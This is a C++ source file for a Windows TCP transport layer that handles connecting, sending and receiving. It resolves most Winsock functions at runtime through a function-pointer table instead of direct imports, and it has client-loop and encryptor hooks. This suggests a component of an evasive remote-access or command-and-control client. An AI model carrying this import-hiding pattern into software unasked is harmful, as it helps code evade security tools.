#include "TCPTransportLayer.h"

#include <winsock2.h>
#include <ws2tcpip.h>
#include <iomanip>  // for std::hex, std::setw, std::setfill
#include <iostream>



// TODO: this constructor shouldn't ever be hit? i also think it's just wrong
/*
TCPTransportLayer::TCPTransportLayer() :
    TransportLayer()
{
    //connected_ = false;
    initializeWinsock();
}*/

TCPTransportLayer::TCPTransportLayer(
    ApiManager* apiManager)
    :
    apiManager_(apiManager),
    TransportLayer() // TODO: does this even do anything? also i think it gets called automatically anyways
{
    //connected_ = false;
    initializeWinsock();
}

TCPTransportLayer::TCPTransportLayer(
    ApiManager* apiManager,
    std::string& server, 
    std::string& port)
    :
    apiManager_(apiManager),
    server_(server),
    port_(port)
{
    initializeWinsock();
}

// TCPTransportLayer::TCPTransportLayer(Encryptor* encryptor) :
//     TransportLayer(encryptor)
// {
//     //connected_ = false;
//     initializeWinsock();
// }

TCPTransportLayer::~TCPTransportLayer()
{
    /*
    if (connected_ == false) // TODO: maybe check if (socket_ != INVALID_SOCKET)
    {
        // TODO: if 5 attempted connects in a row fail, exit, otherwise keep trying
        closesocket(socket_);
        socket_ = INVALID_SOCKET;
    }
    */
    typedef int (WINAPI* FuncWSACleanup) ();
    FuncWSACleanup pWSACleanup = (FuncWSACleanup)apiManager_->fProcedures_["WSACleanup"];
    pWSACleanup();
    //WSACleanup();
}


bool TCPTransportLayer::initializeWinsock()
{

    typedef int (WINAPI* FuncWSAStartup) 
    (WORD wVersionRequired, LPWSADATA lpWSAData);
    FuncWSAStartup pWSAStartup = (FuncWSAStartup)apiManager_->fProcedures_["WSAStartup"];

    // TODO: check if winsock is already initialized somehow?
    WSADATA wsaData;
    if (pWSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    //if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cout << "WSAStartup failed" << std::endl;
        // printf("WSAStartup failed\n");
        return true;
    }
    return false;
    //winsock_initialized = true;

}



bool TCPTransportLayer::send(const RawByteBuffer& data)
{
    std::cout << "TCPTransportLayer::send()" << std::endl;

    if (!connected_ && !connect())
    {
        std::cout << "Not connected and connect failed" << std::endl;
        return false;
    }

    typedef int (WINAPI* FuncSend) 
    (SOCKET s, const char* buf, int len, int flags);
    FuncSend pSend = (FuncSend)apiManager_->fProcedures_["send"];

    int result = pSend(socket_, (const char*)data.data(), data.size(), 0);
    //int result = ::send(socket_, (const char*)data.data(), data.size(), 0);

    return result > 0;

}


bool TCPTransportLayer::connect()
{

    // TODO: move this typedef into some header file? 
    typedef SOCKET(WINAPI* FuncSocket) (int af, int type, int protocol);
    FuncSocket pSocket = (FuncSocket)apiManager_->fProcedures_["socket"];
    socket_ = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    //socket_ = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);


    if (socket_ == INVALID_SOCKET)
    {
        std::cout << "socket invalid" << std::endl;
        return false;
    }

    ADDRINFOA hints, * result = nullptr;
    ZeroMemory(&hints, sizeof(hints));
    // TODO: do this instead of ZeroMemory
    //ADDRINFOA hints = { 0 };
    //ADDRINFOA* result = nullptr;

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    typedef int (WINAPI* FuncGetAddrInfo) 
    (PCSTR pNodeName, PCSTR pServiceName, const ADDRINFO* pHints, LPADDRINFO* ppResult);
    FuncGetAddrInfo pGetAddrInfo = (FuncGetAddrInfo)apiManager_->fProcedures_["getaddrinfo"];


    // if server_ is empty/nullptr, the localhost will be used 
    if (getaddrinfo(server_.c_str(), port_.c_str(), &hints, &result) != 0)
    {
        std::cout << "getaddrinfo failed" << std::endl;
        return false;
    }

    typedef int (WINAPI* FuncConnect)
    (SOCKET s, const struct sockaddr* name, int namelen);
    FuncConnect pConnect = (FuncConnect)apiManager_->fProcedures_["connect"];

    ADDRINFOA* ptr = result; // TODO: no need to assign result to ptr just use result?
    while (ptr != NULL)
    {
        if (pConnect(socket_, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
        //if (::connect(socket_, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
        {
            connected_ = true;
            break;
        }
        ptr = ptr->ai_next;
    }

    typedef int (WINAPI* FuncCloseSocket) (SOCKET s);
    FuncCloseSocket pCloseSocket = (FuncCloseSocket)apiManager_->fProcedures_["closesocket"];
    if (connected_ == false)
    {
        // TODO: if 5 attempted connects in a row fail, exit, otherwise keep trying
        // TODO: if we close socket due to multiple failed connections, we shouldn't 
        //       reopen it right away in ClientSubsystem::run()
        std::cout << "connected_ == false" << std::endl;
        pCloseSocket(socket_);
        //closesocket(socket_);
        socket_ = INVALID_SOCKET;
        return false;
    }

    return true;
}

void TCPTransportLayer::receive()
{
    std::cout << "TCPTransportLayer::receive()" << std::endl;
    if (!connected_)
    {
        return;
    }

    typedef int (WINAPI* FuncRecv)
	(SOCKET s, char* buf, int len, int flags);
    FuncRecv pRecv = (FuncRecv)apiManager_->fProcedures_["recv"];

	RawByteBuffer buffer(4096);
	int received = pRecv(socket_, (char*)buffer.data(), buffer.size(), 0);
	//int received = recv(socket_, (char*)buffer.data(), buffer.size(), 0);

	if (received <= 0)
	{
		connected_ = false;
        return;
	}

	buffer.resize(received);

	if (receiveCallback_)
	{
		receiveCallback_(buffer); 
	}
}

